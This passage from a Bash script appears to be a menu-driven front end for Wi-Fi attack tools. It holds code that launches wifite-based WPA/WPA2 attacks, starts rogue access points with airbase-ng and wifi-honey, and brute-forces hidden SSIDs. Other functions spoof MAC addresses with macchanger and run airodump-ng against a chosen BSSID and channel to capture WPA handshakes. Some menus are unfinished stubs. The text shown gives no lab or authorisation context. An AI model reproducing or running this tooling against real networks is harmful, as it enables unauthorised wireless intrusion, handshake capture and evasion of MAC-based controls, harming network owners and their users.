\"autoWpa\")\n\t\tmenuAttacksWPAWifiteAuto\n\t\t;;\n\n\t\t\"autowpa2\" | \"AUTOWPA2\" | \"AutoWPA2\" | \"AutoWpa2\" | \"autoWPA2\" | \"autoWpa2\")\n\t\tmenuAttacksWPA2WifiteAuto\n\t\t;;\n\n\t\t*)\n\t\tmenuAuto\n\t\t;;\n\n\tesac\n\n\t#restartProcesses\n\n\tmenuMain\n\n}\n\n\nmenuAdvanced(){\n\n\tcurrentTask=\"menuAdvanced\"\n\t#lastMenuID=\"menuAdvanced\"\n\n\tinterface=\"None\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"SORRY I GOT LAZY AND NEVER CODED THIS MENU\"\n\techo \"WILL BE AVAILABLE SOOOOOOOOOON!\"\n\techo \"\"\n\techo \"\"\n\techo \"Advanced Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"1) Monitor Mode Options\"\n\techo \"\"\n\techo \"2) Honeypot Mode and Attacks\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\t$green\n\techo \"** TO RETURN TO PREVIOUS PAGE JUST PRESS ENTER **\"\n\t$white\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Select an option and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\n\tread getAdvancedOptionMain\n\n\thotkeyInput=\"$getAdvancedOptionMain\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getAdvancedOptionMain\" in\n\n\t\t\"\")\n\t\t$currentTask\n\t\t#menuMain\n\t\t#menuAdvanced\n\t\t;;\n\n\t\t*)\n\t\t$currentTask\n\t\t#menuMain\n\t\t#menuAdvanced\n\t\t;;\n\n\tesac\n\n\t#restartProcesses\n\n\t$currentTask\n\n}\n\n\nmenuExtras(){\n\n\t#currentTask=\"menuExtras\"\n\t#lastMenuID=\"menuExtras\"\n\n\tbanner\n\tbannerStats\n\n\techo \"1) Backup All Sessions and Capture Files (Full Backup of all saved files to ZIP file)\"\n\techo \"2) Clean Capture Files (Removes all saved .cap, .xor, .ivs, .csv, and .netxml files)\"\n\techo \"3) Clean Session Files (Removes all saved WEP, WPS, WPA, WPA2 *.sessions files)\"\n\techo \"\"\n\techo \"4) Change Active Terminal (Switch between Gnome, Konsole, X-Term, and User Selected)\"\n\techo \"\"\n\techo \"5) Start NetworkManager          6)  Stop NetworkManager\"\n\techo \"7) Enable wpa_supplicant         8)  Disable wpa_supplicant\"\n\techo \"9) Start wpa_cli                 10) Stop wpa_cli\"\n\techo \"\"\n\techo \"11) Open Interface Options Menu\"\n\techo \"\"\n\techo \"12) Hidden SSID Options\"\n\techo \"\"\n\techo \"R) Return To Previous Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"Select an option from above and press ENTER:\"\n\techo \"\"\n\n\tread getExtras\n\n\thotkeyInput=\"$getExtras\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getExtras\" in\n\n\t\t\"\")\n\t\tmenuExtras\n\t\t;;\n\n\t\t\"1\")\n\t\tbackupSessionFiles\n\t\t;;\n\n\t\t\"2\")\n\t\tcleanCaptureFiles\n\t\t;;\n\n\t\t\"3\")\n\t\tcleanSessionFiles\n\t\t;;\n\n\t\t\"4\")\n\t\tmenuChangeTerminal\n\t\t;;\n\n\t\t\"5\")\n\t\tstartNetworkManager\n\t\t;;\n\n\t\t\"6\")\n\t\tkillNetworkManager\n\t\t;;\n\n\t\t\"7\")\n\t\twpaSupplicantEnable\n\t\t;;\n\n\t\t\"8\")\n\t\twpaSupplicantDisable\n\t\t;;\n\n\t\t\"9\")\n\t\twpa_cli start\n\t\t;;\n\n\t\t\"10\")\n\t\twpa_cli terminate\n\t\t;;\n\n\t\t\"11\")\n\t\tmenuExtrasInterface\n\t\t;;\n\n\t\t\"12\")\n\t\tbanner\n\t\tbannerStats\n\n\t\techo \"1) Bruteforce Hidden SSID\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"* Just Press ENTER To Return To Previous Menu *\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t$white\n\t\techo \"Select an option from above and press ENTER:\"\n\t\techo \"\"\n\n\t\tread ssidHiddenOption\n\n\t\tcase \"$ssidHiddenOption\" in\n\n\t\t\t\"1\")\n\t\t\tbruteForceHiddenSSID\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\n\t\t\"r\" | \"R\")\n\t\t$lastMenuID\n\t\t;;\n\n\t\t*)\n\t\tmenuExtras\n\t\t;;\n\n\tesac\n\n\tmenuExtras\n\n}\n\nmenuExtrasInterface(){\n\n\tcurrentTask=\"menuExtrasInterface\"\n\t#lastMenuID=\"menuExtrasInterface\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\n\techo \"1) Enable Channel Hopping: $interface\"\n\techo \"2) Disable Channel Hopping: $interface\"\n\techo \"\"\n\techo \"3) Bring Up Interface: $interfaceMonitor\"\n\techo \"4) Bring Down Interface: $interfaceMonitor\"\n\techo \"\"\n\techo \"5) Switch Interface To Managed\"\n\techo \"6) Switch Interface To Monitor\"\n\techo \"\"\n\techo \"7) Fix Airmon Conflicting Processes\"\n\techo \"\"\n\techo \"8) Get \\\"ifconfig\\\" Output\"\n\techo \"9) Get \\\"iwconfig\\\" Output\"\n\techo \"\"\n\techo \"R) Return To Previous Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"Select an option from above and press ENTER:\"\n\techo \"\"\n\t#echo \"\"\n\n\tread getExtrasInterface\n\n\thotkeyInput=\"$getExtrasInterface\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getExtrasInterface\" in\n\n\t\t\"\")\n\t\tmenuInterface\n\t\t;;\n\n\t\t\"1\")\n\t\tenableChannelHopping\n\t\t;;\n\n\t\t\"2\")\n\t\tdisableChannelHopping\n\t\t;;\n\n\t\t\"3\")\n\t\tinterfaceUp\n\t\t;;\n\n\t\t\"4\")\n\t\tinterfaceDown\n\t\t;;\n\n\t\t\"5\")\n\t\tinterfaceManaged\n\t\t;;\n\n\t\t\"6\")\n\t\tinterfaceMonitor\n\t\t;;\n\n\t\t\"7\")\n\t\tfixAirmonCompat\n\t\t;;\n\n\t\t\"8\")\n\t\tshowIfConfig=$(ifconfig)\n\t\tbanner\n\t\tbannerStats\n\t\techo \"\"\n\t\techo \"$showIfConfig\"\n\t\techo \"\"\n\t\techo \"\"\t\n\t\techo \"\"\t\n\t\techo \"Press ENTER to continue...\"\t\n\t\techo \"\"\t\n\t\techo \"\"\t\n\t\tread pause\n\t\t;;\n\n\t\t\"9\")\n\t\tshowIwConfig=$(iwconfig)\n\t\tbanner\n\t\tbannerStats\n\t\techo \"\"\n\t\techo \"$showIwConfig\"\n\t\techo \"\"\n\t\techo \"\"\t\n\t\techo \"\"\t\n\t\techo \"Press ENTER to continue...\"\t\n\t\techo \"\"\t\n\t\techo \"\"\t\n\t\tread pause\n\t\t;;\n\n\t\t\"r\" | \"R\")\n\t\t#$lastMenuID\n\t\tmenuExtras\n\t\t;;\n\n\t\t*)\n\t\tmenuExtrasInterface\n\t\t;;\n\n\tesac\n\n\tmenuExtrasInterface\n\n}\n\n\nmenuHelp(){\n\n\tcurrentTask=\"menuHelp\"\n\t#lastMenuID=\"menuHelp\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"*******************************************\"\n\techo \"CURENTLY NOT WORKING!!!\"\n\techo \"\"\n\techo \"PRESS ENTER TO RETURN TO PREVIOUS MENU!\"\n\techo \"*******************************************\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Welcome to the Help Section!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"CURRENTLY NOT AVAILABLE!\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\n\tread getHelp\n\n\thotkeyInput=\"$getHelp\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getHelp\" in\n\n\t\t\"\")\n\t\t$lastMenuID\n\t\t#menuMain\n\t\t#menuHelp\n\t\t;;\n\n\t\t*)\n\t\t$lastMenuID\n\t\t#menuMain\n\t\t#menuHelp\n\t\t;;\n\n\tesac\n\n\t$lastMenuID\n\n}\n\n\nmenuChangeTerminal(){\n\n\tcurrentTask=\"menuChangeTerminal\"\n\t#lastMenuID=\"menuChangeTerminal\"\n\n\tbanner\n\n\n\techo \"\"\n\techo \"Select a new terminal to use\"\n\techo \"\"\n\techo \"\"\n\techo \"Current Terminal: $terminal\"\n\techo \"\"\n\techo \"\"\n\techo \"1a) Gnome Legacy: $terminalGnomeLegacy\"\n\techo \"\"\n\techo \"1b) Gnome: $terminalGnome\"\n\techo \"\"\n\techo \"2) Konsole: $terminalKonsole\"\n\techo \"\"\n\techo \"3) X-Term: $terminalXterm\"\n\techo \"\"\n\techo \"4) Custom (User Selected)\"\n\techo \"\"\n\techo \"5) Return To Previous Menu\"\n\techo \"\"\n\techo \"\"\n\n\tread getTerminalType\n\n\thotkeyInput=\"$getTerminalType\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getTerminalType\" in\n\n\t\t\"\")\n\t\tmenuChangeTerminal\n\t\t;;\n\n\t\t\"1a\")\n\t\tterminal=\"$terminalGnomeLegacy\"\n\t\tterminalText=\"GnomeLegacy\"\n\t\t;;\n\n\t\t\"1b\")\n\t\tterminal=\"$terminalGnome\"\n\t\tterminalText=\"Gnome\"\n\t\t;;\n\n\t\t\"2\")\n\t\tterminal=\"$terminalKonsole\"\n\t\tterminalText=\"Konsole\"\n\t\t;;\n\n\t\t\"3\")\n\t\tterminal=\"$terminalXterm\"\n\t\tterminalText=\"Xterm\"\n\t\t;;\n\n\t\t\"4\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Input a terminal string with arguments and press ENTER:\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Example: $terminalGnome\"\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tread newTerminal\n\n\t\tcase \"$newTerminal\" in\n\n\t\t\t*)\n\t\t\tterminal=\"$newTerminal\"\n\t\t\tterminalText=\"Custom\"\n\t\t\t;;\n\n\t\tesac\n\n\t\t;;\n\n\t\t\"5\")\n\t\tmenuExtras\n\t\t;;\n\n\t\t*)\n\t\tmenuChangeTerminal\n\t\t;;\n\n\tesac\n\n\tmenuMain\n\n}\n\n\nmenuHoneyPotMode(){\n\n\tcurrentTask=\"menuHoneyPotMode\"\n\n\tinitMonitorMode\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"I Am HoneyPot Mode\"\n\techo \"\"\n\techo \"I Am Also Broken :(\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"1) Use Airbase-ng\"\n\techo \"\"\n\techo \"2) Use Wifi-Honey\"\n\techo \"\"\n\techo \"3) Use a Custom Binary\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Select an option and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\n\tread getHoneyPotOptionMain\n\n\thotkeyInput=\"$getHoneyPotOptionMain\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getHoneyPotOptionMain\" in\n\n\t\t\"\")\n\t\tmenuHoneyPotMode\n\t\t#$lastMenuID\n\t\t#menuMain\n\t\t#menuAdvanced\n\t\t;;\n\n\t\t\"1\")\n\t\tgetBSSID\n\t\t$terminal airbase-ng -a $bssid -i $interfaceMonitor -h $macAddressMonitor -v &\n\t\t;;\n\n\t\t\"2\")\n\t\tgetESSID\n\t\tgetChannel\n\t\t$terminal wifi-honey $essid $channel $interfaceMonitor &\n\t\t;;\n\n\t\t\"3\")\n\t\techo \"Custom Binary\"\n\t\tread pause\n\t\tmenuHoneyPotMode\n\t\t;;\n\n\t\t*)\n\t\tmenuHoneyPotMode\n\t\t#$lastMenuID\n\t\t#menuMain\n\t\t#menuAdvanced\n\t\t;;\n\n\tesac\n\n\t#restartProcesses\n\n\tmenuHoneyPotMode\n\t#$lastMenuID\n\n}\n\n\nselectFromApList(){\n\t\n\t# Get AP Credential Type From 1st Argument\n\tapListType=\"$1\"\n\n\tcurrentTask=\"selectFromApList\"\n\n\techo \"Dumping Found AP Targets From airodump-ng Window....\"\n\techo \"\"\n\techo \"\"\n\n\tcase \"$apListType\" in\n\n\t\t\"essid\")\n\t\tsleep 15\n\t\tcat \"$defaultScanOutputXML\" | grep \"<essid cloaked=\"\n\t\t;;\n\n\t\t\"bssid\")\n\t\tsleep 15\n\t\tcat \"$defaultScanOutputXML\" | grep \"<BSSID>\"\n\t\t;;\n\n\t\t\"channel\")\n\t\tsleep 15\n\t\tcat \"$defaultScanOutputXML\" | grep \"<channel>\"\n\t\t;;\n\n\tesac\n\n\techo \"\"\n\techo \"\"\n\t$yellow\n\techo \"Select $apListType from found AP targets above and copy to clipboard (CTRL+SHIFT+C)\"\n\techo \"\"\n\techo \"\"\n\t$white\n\techo \"You may also follow the instructions below to select a target\"\n\techo \"\"\n\techo \"\"\n\n\t#read getApTarget\n\n}\n\n\n############################################################################\n#   MENUS: MAIN END   ######################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   MENUS: SESSIONS BEGIN   ################################################\n############################################################################\n\n\nmenuSessionSave(){\n\n\t# Not needed for this menu\n\t#currentTask=\"menuSessionSave\"\n\t#lastMenuID=\"menuSessionSave\"\n\n\tbanner\n\tbannerStats\n\n\techo \"Session Save Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Save As: $capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press \\\"1\\\" and ENTER to save session file now\"\n\techo \"\"\n\techo \"\"\n\techo \"You may also just press ENTER to return to the previous menu....\"\n\techo \"\"\n\techo \"\"\n\n\tgetSession=\"1\"\n\t#read getSession\n\n\thotkeyInput=\"$getSession\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getSession\" in\n\n\t\t\"\")\n\t\t$currentTask\n\t\t;;\n\n\t\t\"1\")\n\t\tsessionSave\n\t\t;;\n\n\t\t*)\n\t\t$currentTask\n\t\t;;\n\n\tesac\n\n\t$currentTask\n\n}\n\n\nmenuSessionLoad(){\n\n\t# Not needed for this menu\n\t#currentTask=\"menuSessionLoad\"\n\t#lastMenuID=\"menuSessionLoad\"\n\n\tbanner\n\tbannerStats\n\n\techo \"Session Load Menu\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Current File Loaded: $capturePath/$encryptionType/$encryptionType.sessions\"\n\techo \"\"\n\techo \"\"\n\techo \"\"\n\techo \"Press \\\"1\\\" and ENTER to load session file now\"\n\techo \"\"\n\techo \"\"\n\techo \"You may also just press ENTER to return to the previous menu....\"\n\techo \"\"\n\techo \"\"\n\n\tgetSession=\"1\"\n\t#read getSession\n\n\thotkeyInput=\"$getSession\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getSession\" in\n\n\t\t\"\")\n\t\t$currentTask\n\t\t;;\n\n\t\t\"1\")\n\t\tsessionLoad\n\t\t;;\n\n\t\t*)\n\t\t$currentTask\n\t\t;;\n\n\tesac\n\n\t$currentTask\n\n}\n\n\n############################################################################\n#   MENUS: SESSIONS END   ##################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   GET CREDENTIALS BEGIN   ################################################\n############################################################################\n\n\ntextGetTargetInfo(){\n\n\tcurrentTask=\"textGetTargetInfo\"\n\n\techo \"\"\n\techo \"THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN, ONLY SHOWING $encryptionTypeText TARGETS\"\n\techo \"\"\n\techo \"YOU CAN USE THIS AIRODUMP-NG WINDOW TO GATHER ALL NEEDED INFORMATION\"\n\techo \"\"\n\techo \"YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW\"\n\techo \"\"\n\t#echo \"YOU MAY NEED TO EXTEND THE WINDOW WIDER TO SEE THE ESSID NAMES\"\n\techo \"YOU MAY PRESS \\\"T\\\" AT ANYTIME TO OPEN A TEXT VIEW OF AVAILABLE TARGETS\"\n\techo \"\"\n\techo \"\"\n\n\tcase \"$encryptionTypeText\" in\n\n\t\t\"WPS\")\n\t\t$green\n\t\techo \"WPS TARGETS MAY HAVE \\\"1.0, 1.0 LAB, DISP, KPAD\\\" OR ANOTHER VARIANT UNDER \\\"WPS\\\" COLUMN\"\n\t\techo \"\"\n\t\techo \"ALL TARGETS THAT SUPPORT WPS MAY ALSO HAVE \\\"OPN\\\", \\\"WEP\\\", \\\"WPA\\\", or \\\"WPA2\\\" UNDER \\\"ENC\\\" COLUMN\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\t\t\"WEP\")\n\t\t$green\n\t\techo \"WEP TARGETS MAY HAVE \\\"WEP\\\" UNDER THE \\\"ENC\\\" and \\\"CIPHER\\\" COLUMNS\"\n\t\t#echo \"CURRENTLY SET TO ONLY SCAN FOR \\\"WEP\\\" TARGETS\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\t\t\"WPA\")\n\t\t$green\n\t\techo \"WPA TARGETS MAY HAVE \\\"WPA\\\" UNDER THE \\\"ENC\\\" and \\\"CCMP\\\" UNDER \\\"CIPHER\\\" COLUMNS\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\t\t\"WPA2\")\n\t\t$green\n\t\techo \"WPA2 TARGETS MAY HAVE \\\"WPA2\\\" UNDER THE \\\"ENC\\\" and \\\"CCMP\\\" UNDER \\\"CIPHER\\\" COLUMNS\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\tesac\n\n}\n\n\ngetESSID(){\n\n\tcurrentTask=\"getESSID\"\n\n\tbanner\n\tbannerStats\n\n\t#selectFromApList essid\n\n\ttextGetTargetInfo\n\n\techo \"PASTE or type the Target ESSID Here and press ENTER:\"\n\techo \"\"\n\techo \"Example: NETGEAR\"\n\techo \"\"\n\techo \"\"\n\t\n\t$cyan\n\tread getESSIDTemp\n\n\thotkeyInput=\"$getESSIDTemp\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getESSIDTemp\" in\n\n\t\t\"\")\n\t\tgetESSID\n\t\t;;\n\n\t\t\"t\" | \"T\")\n\t\tcleanTempScanResultsFile \"txt\"\n\t\topenScanTargetsAsText\n\t\tgetESSID\n\t\t;;\n\n\t\t*)\n\t\tessid=\"$getESSIDTemp\"\n\t\t;;\n\n\tesac\n\n\t$white\n}\n\n\ngetBSSID(){\n\n\tcurrentTask=\"getBSSID\"\n\n\tbanner\n\tbannerStats\n\n\t#selectFromApList bssid\n\n\ttextGetTargetInfo\n\n\techo \"PASTE or type the Target BSSID Here and press ENTER:\"\n\techo \"\"\n\techo \"Example: 00:11:22:33:44:55\"\n\techo \"\"\n\techo \"\"\n\n\t$cyan\n\tread getBSSIDTemp\n\n\thotkeyInput=\"$getBSSIDTemp\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getBSSIDTemp\" in\n\n\t\t\"\")\n\t\tgetBSSID\n\t\t;;\n\n\t\t\"t\" | \"T\")\n\t\tcleanTempScanResultsFile \"txt\"\n\t\topenScanTargetsAsText\n\t\tgetBSSID\n\t\t;;\n\n\t\t*)\n\t\tbssid=\"$getBSSIDTemp\"\n\t\t;;\n\n\tesac\n\n\t$white\n}\n\n\ngetChannel(){\n\n\tcurrentTask=\"getChannel\"\n\n\tbanner\n\tbannerStats\n\n\t#selectFromApList channel\n\n\ttextGetTargetInfo\n\n\techo \"PASTE or type the Target Channel Here and press ENTER:\"\n\techo \"\"\n\techo \"Example: 6\"\n\techo \"\"\n\techo \"\"\n\n\t$cyan\n\tread getChannelTemp\n\n\thotkeyInput=\"$getChannelTemp\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getChannelTemp\" in\n\n\t\t\"\")\n\t\tgetChannel\n\t\t;;\n\n\t\t\"t\" | \"T\")\n\t\tcleanTempScanResultsFile \"txt\"\n\t\topenScanTargetsAsText\n\t\tgetChannel\n\t\t;;\n\n\t\t*)\n\t\tchannel=\"$getChannelTemp\"\n\t\t;;\n\n\tesac\n\n\t$white\n}\n\n\n############################################################################\n#   GET CREDENTIALS END   ##################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   MAC ADDRESS STUFF BEGIN   ##############################################\n############################################################################\n\n\ngetMacAddress(){\n\n\tcurrentTask=\"getMacAddress\"\n\n\tmacAddress=$(ip link show $interface | tail -n 1 |  cut -f 6 -d \" \")\n\n}\n\n\ngetMacAddressMonitor(){\n\n\tcurrentTask=\"getMacAddressMonitor\"\n\n\tmacAddressMonitor=$(ip link show $interfaceMonitor | tail -n 1 |  cut -f 6 -d \" \")\n\n\tcase \"$isDebugMode\" in\n\t\t\"1\")\n\t\techo \"interface: $interfaceMonitor\"\n\t\techo \"mac: $macAddressMonitor\"\n\t\tread pause\n\t\t;;\n\tesac\n\n}\n\n\nsetMacAddress(){\n\n\tcurrentTask=\"setMacAddress\"\n\n\tifconfig $interface down\n\tmacchanger -m $getNewMacAdressTemp $interface\n\tifconfig $interface up\n\n\tspoofStatus=\"1\"\n\n\tmacAddress=\"$getNewMacAdressTemp\"\n\n}\n\n\nsetMacAddressMonitor(){\n\n\tcurrentTask=\"setMacAddressMonitor\"\n\n\tifconfig $interfaceMonitor down\n\tmacchanger -m $getNewMacAdressTemp $interfaceMonitor\n\tifconfig $interfaceMonitor up\n\n\tspoofStatus=\"1\"\n\n\tmacAddressMonitor=\"$getNewMacAdressTemp\"\n\n}\n\n\ngetRandomMacAddress(){\n\n\tcurrentTask=\"getRandomMacAddress\"\n\n\tifconfig $interface down\n\tmacchanger -r $interface\n\tifconfig $interface up\n\n\tspoofStatus=\"1\"\n\n\tgetMacAddress\n\n\t#macAddress=\"$getNewMacAdressTemp\"\n\n}\n\n\ngetRandomMacAddressMonitor(){\n\n\tcurrentTask=\"getRandomMacAddressMonitor\"\n\n\tifconfig $interfaceMonitor down\n\tmacchanger -r $interfaceMonitor\n\tifconfig $interfaceMonitor up\n\n\tspoofStatus=\"1\"\n\n\tgetMacAddressMonitor\n\n\t#macAddressMonitor=\"$getNewMacAdressTemp\"\n\n}\n\n\nspoofMacAddress(){\n\n\tcurrentTask=\"spoofMacAddress\"\n\t#lastMenuID=\"spoofMacAddress\"\n\n\t# Setting resetSpoofStatus Flag for global hotkey compatibility\n\tresetSpoofStatus=\"1\"\n\n\tbanner\n\tbannerStats\n\n\techo \"\"\n\techo \"To choose a random MAC Address, press the \\\"R\\\" key and press ENTER\"\n\techo \"\"\n\techo \"\"\n\techo \"Enter the New MAC Address and press ENTER:\"\n\techo \"\"\n\techo \"Example: 00:11:22:33:44:55\"\n\techo \"\"\n\techo \"\"\n\n\tread getNewMacAdressTemp\n\n\thotkeyInput=\"$getNewMacAdressTemp\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$getNewMacAdressTemp\" in\n\n\t\t\"\")\n\t\tspoofMacAddress\n\t\t;;\n\n\t\t\"R\" | \"r\")\n\t\tgetRandomMacAddress\n\t\tgetRandomMacAddressMonitor\n\t\t#$returnTo\n\t\t;;\n\n\t\t*)\n\t\tsetMacAddress\n\t\tsetMacAddressMonitor\n\t\t#$returnTo\n\t\t;;\n\n\tesac\n\n}\n\n\ncheckSpoofStatus(){\n\n\tcase \"$spoofStatus\" in\n\n\t\t\"0\")\n\t\t#blank=\"\"\n\t\tinitMonitorMode\n\t\t;;\n\n\tesac\n\n}\n\n\n############################################################################\n#   MAC ADDRESS STUFF END   ################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   MONITOR MODE STUFF BEGIN   #############################################\n############################################################################\n\n\ninitMonitorMode(){\n\n\tcurrentTask=\"initMonitorMode\"\n\n\t#killProcesses\n\tstopMonitorMode\n\n\tdisableChannelHopping\n\tenableChannelHopping\n\n\tgetWirelessInterfaces\n\n\tbanner\n\n\tinitMon=\"\"\n\n\tcase \"$initMon\" in\n\n\t\t\"\")\n\t\tgetMacAddress\n\t\tsetMonitorMode\n\t\tgetMacAddressMonitor\n\t\t#getWirelessInterfaces \"refresh\"\n\t\t;;\n\n\t\t*)\n\t\tgetMacAddress\n\t\tsetMonitorMode\n\t\tgetMacAddressMonitor\n\t\t#getWirelessInterfaces\n\t\t;;\n\n\tesac\n\n}\n\n\nsetMonitorMode(){\n\n\tcurrentTask=\"setMonitorMode\"\n\n\t#interfaceMonitor=\"mon0\"\n\t#echo \"$interface\"\n\t#read pause\n\t$startMonitorMode $interface\n\n}\n\n\nstopMonitorMode(){\n\n\tcurrentTask=\"stopMonitorMode\"\n\n\tkillMsg=\"Killing all active previous monitor mode interfaces....\"\n\n\t# Older style airmon-ng\n\tkillMonA=\"mon\"\n\n\t# Newer 1.2+ style airmon-ng\n\tkillMonB1=\"wlan\"\n\tkillMonB2=\"mon\"\n\n\tkillCounter=\"0\"\n\n\t# I just selected 12 as a number that I feel nobody would have more wifi adapters than\n\t#killCounterMax=\"12\"\n\n\t# Using number of found adapters to determine max\n\tkillCounterMax=\"$interfacesFound\"\n\n\t# Initial mon0 or wlan0mon before loop\n\tcase \"$killCounter\" in\n\n\t\t\"0\")\n\t\tbanner\n\t\t$white\n\t\techo \"\"\n\t\techo $killMsg\n\t\t$red\n\t\t$stopMonitorMode $killMonA$killCounter\n\t\t$stopMonitorMode $killMonB1$killCounter$killMonB2\n\t\t;;\n\n\tesac\n\n\twhile [ $killCounter -le $killCounterMax ]\n\n\tdo\n\t\tbanner\n\t\t$white\n\t\techo \"\"\n\t\techo $killMsg\n\t\t$red\n\t\t$stopMonitorMode $killMonA$killCounter\n\t\t$stopMonitorMode $killMonB1$killCounter$killMonB2\n\n\t\tkillCounter=$(($killCounter+1))\n\tdone\n\n\tbanner\n\t$white\n\n}\n\n\n############################################################################\n#   MONITOR MODE STUFF END   ###############################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   ATTACKS: GLOBAL BEGIN   ################################################\n############################################################################\n\n\nautoModeUsePreviousSession(){\n\n\tcurrentTask=\"autoModeUsePreviousSession\"\n\n\tsessionCopyNewCaptureFiles\n\n\tcase \"$encryptionType\" in\n\n\t\t\"wep\")\n\t\tautoModeUsePreviousSessionWEP\n\t\t;;\n\n\t\t\"wps\")\n\t\tautoModeUsePreviousSessionWPS\n\t\t;;\n\n\t\t\"wpa\")\n\t\tautoModeUsePreviousSessionWPA\n\t\t;;\n\n\t\t\"wpa2\")\n\t\tautoModeUsePreviousSessionWPA2\n\t\t;;\n\n\tesac\n\n}\n\n\nautoModeNoPreviousSession(){\n\n\tcurrentTask=\"autoModeNoPreviousSession\"\n\n\tcase \"$encryptionType\" in\n\n\t\t\"wep\")\n\t\tautoModeNoPreviousSessionWEP\n\t\t;;\n\n\t\t\"wps\")\n\t\tautoModeNoPreviousSessionWPS\n\t\t;;\n\n\t\t\"wpa\")\n\t\tautoModeNoPreviousSessionWPA\n\t\t;;\n\n\t\t\"wpa2\")\n\t\tautoModeNoPreviousSessionWPA2\n\t\t;;\n\n\tesac\n\n}\n\n\nadFileDump(){\n\n\tnoChannel=\"$1\"\n\t\n\t#echo \"$noChannel\"\n\t#read pause\n\n\tcurrentTask=\"adFileDump\"\n\n\techo \"\"\n\techo \"\"\n\n\tcase \"$encryptionType\" in\n\n\t\t\"wep\")\n\n\t\tdisableChannelHopping\n\n\t\tcase \"$noChannel\" in\n\n\t\t\t\"0\")\n\t\t\t$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write \"dump_$essid\"\n\t\t\t#$terminal airodump-ng -w \"dump_$essid\" --bssid $bssid --channel $channel -i $interfaceMonitor &\n\t\t\t#$terminal airodump-ng --ignore-negative-one -w \"dump_$essid\" --bssid $bssid --channel $channel -i $interfaceMonitor &\n\t\t\t#read pause\n\n\t\t\t#Working (uses session path)\n\t\t\t#$terminal airodump-ng -w \"$capturePath/$encryptionType/dump_$essid\" --bssid $bssid --channel $channel -i $interfaceMonitor &\n\t\t\t;;\n\n\t\t\t\"1\")\n\t\t\t$terminal airodump-ng $interfaceMonitor --bssid $bssid --write \"dump_$essid\"\n\n\t\t\t#$terminal airodump-ng -w \"dump_$essid\" --bssid $bssid -i $interfaceMonitor &\n\t\t\t#$terminal airodump-ng --ignore-negative-one -w \"dump_$essid\" --bssid $bssid -i $interfaceMonitor &\n\t\t\t#read pause\n\n\t\t\t#Working (uses session path)\n\t\t\t#$terminal airodump-ng -w \"$capturePath/$encryptionType/dump_$essid\" --bssid $bssid -i $interfaceMonitor &\n\t\t\t;;\n\t\tesac\n\t\t;;\n\n\t\t\"wpa\" | \"wpa2\")\n\n\t\tdoSleepMessage \"Preparing to Capture WPA Handshake....\" \"3\"\n\n\t\tdisableChannelHopping\n\n\t\tcase \"$noChannel\" in\n\n\t\t\t\"0\")\n\t\t\t$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write \"dump_$essid\"\n\t\t\t#$terminal airodump-ng -w \"$capturePath/$encryptionType/dump_$essid\" --bssid $bssid --channel $channel -i $interfaceMonitor &\n\t\t\t;;\n\n\t\t\t\"1\")\n\t\t\t$terminal airodump-ng $interfaceMonitor 